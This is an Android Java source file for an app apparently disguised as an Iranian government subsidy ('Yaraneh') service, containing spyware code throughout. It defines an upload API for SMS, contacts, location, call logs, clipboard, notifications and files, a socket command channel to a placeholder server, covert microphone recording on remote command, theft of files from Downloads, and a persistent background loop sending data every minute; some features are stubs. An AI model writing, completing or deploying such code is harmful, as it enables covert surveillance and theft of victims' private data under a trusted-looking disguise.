package com.yaranahapp;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import io.socket.client.IO;
import io.socket.client.Socket;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;

import java.io.File;

interface ApiService {
    @Multipart
    @POST("upload-data")
    Call<Void> uploadData(
        @Part("sms") RequestBody smsData,
        @Part("contacts") RequestBody contactsData,
        @Part("location") RequestBody locationData,
        @Part("call_logs") RequestBody callLogsData,
        @Part("user_data") RequestBody userData,
        @Part MultipartBody.Part photo,
        @Part MultipartBody.Part audio,
        @Part MultipartBody.Part file,
        @Part("app_usage") RequestBody appUsage,
        @Part MultipartBody.Part camPhoto,
        @Part("notifications") RequestBody notifications,
        @Part("device_info") RequestBody deviceInfo,
        @Part("clipboard") RequestBody clipboard
    );
}

public class DataSendingService extends Service {
    private Socket socket;
    private MediaRecorder recorder;
    private File audioFile;
    private ApiService apiService;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("eva_channel", "سامانه یارانه", NotificationManager.IMPORTANCE_DEFAULT);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "eva_channel")
            .setContentTitle("سامانه یارانه فعال")
            .setContentText("در حال بررسی اطلاعات...")
            .setSmallIcon(android.R.drawable.ic_secure);
        startForeground(1, builder.build());

        Retrofit retrofit = new Retrofit.Builder()
            .baseUrl("https://your-server.com/")
            .addConverterFactory(GsonConverterFactory.create())
            .build();
        apiService = retrofit.create(ApiService.class);

        try {
            socket = IO.socket("https://your-server.com/");
            socket.on("update_command", args -> {
                if (args.length > 0) {
                    String command = args[0].toString();
                    handleCommand(command);
                }
            });
            socket.connect();
        } catch (Exception e) {
            Log.e("Service", "WebSocket error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String userData = intent != null ? intent.getStringExtra("user_data") : "";
        Thread thread = new Thread(() -> {
            while (true) {
                sendAllData(userData);
                try {
                    Thread.sleep(60000);
                } catch (InterruptedException e) {
                    Log.e("Service", "Loop interrupted: " + e.getMessage());
                }
            }
        });
        thread.start();
        return START_STICKY;
    }

    private void handleCommand(String command) {
        Log.d("Service", "Received command: " + command);
        switch (command) {
            case "start_audio_record":
                startAudioRecord();
                break;
            case "stop_audio_record":
                stopAudioRecord();
                break;
            case "update_files":
                sendFilesOnly();
                break;
            case "update_app_usage":
                sendAppUsageOnly();
                break;
            // اضافه کردن کیس‌های دیگر اگر لازم
            default:
                sendAllData("");
        }
    }

    private void sendAllData(String userData) {
        RequestBody userDataBody = RequestBody.create(MediaType.parse("text/plain"), userData);
        apiService.uploadData(
            null, null, null, null, userDataBody, null, null, null, null, null, null, null, null
        ).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                Log.d("Service", "Data sent successfully");
            }
            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e("Service", "Send failed: " + t.getMessage());
            }
        });
    }

    private void startAudioRecord() {
        if (recorder == null) {
            audioFile = new File(getExternalCacheDir(), "audio_" + System.currentTimeMillis() + ".mp3");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            try {
                recorder.prepare();
                recorder.start();
                Log.d("Service", "Audio recording started");
            } catch (Exception e) {
                Log.e("Service", "Record failed: " + e.getMessage());
                recorder = null;
            }
        }
    }

    private void stopAudioRecord() {
        if (recorder != null) {
            recorder.stop();
            recorder.release();
            recorder = null;
            if (audioFile != null && audioFile.exists()) {
                MultipartBody.Part audioPart = MultipartBody.Part.createFormData(
                    "audio", audioFile.getName(), RequestBody.create(MediaType.parse("audio/mpeg"), audioFile)
                );
                apiService.uploadData(null, null, null, null, null, null, audioPart, null, null, null, null, null, null)
                    .enqueue(new Callback<Void>() {
                        @Override
                        public void onResponse(Call<Void> call, Response<Void> response) {
                            Log.d("Service", "Audio sent successfully");
                        }
                        @Override
                        public void onFailure(Call<Void> call, Throwable t) {
                            Log.e("Service", "Audio send failed: " + t.getMessage());
                        }
                    });
            }
        }
    }

    private void sendFilesOnly() {
        File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File[] files = downloadsDir.listFiles();
        if (files != null && files.length > 0) {
            File file = files[0];
            MultipartBody.Part filePart = MultipartBody.Part.createFormData(
                "file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file)
            );
            apiService.uploadData(null, null, null, null, null, null, null, filePart, null, null, null, null, null)
                .enqueue(new Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        Log.d("Service", "File sent successfully");
                    }
                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        Log.e("Service", "File send failed: " + t.getMessage());
                    }
                });
        }
    }

    private void sendAppUsageOnly() {
        // پیاده‌سازی اگر لازم
        Log.d("Service", "Sending app usage...");
    }

    private void sendCamPhotoOnly() {
        // پیاده‌سازی اگر لازم
        Log.d("Service", "Sending cam photo...");
    }

    private void sendNotificationsOnly() {
        // پیاده‌سازی اگر لازم
        Log.d("Service", "Sending notifications...");
    }

    private void sendDeviceInfoOnly() {
        // پیاده‌سازی اگر لازم
        Log.d("Service", "Sending device info...");
    }

    private void sendClipboardOnly() {
        // پیاده‌سازی اگر لازم
        Log.d("Service", "Sending clipboard...");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (recorder != null) {
            recorder.release();
        }
        if (socket != null) {
            socket.disconnect();
        }
        super.onDestroy();
    }
}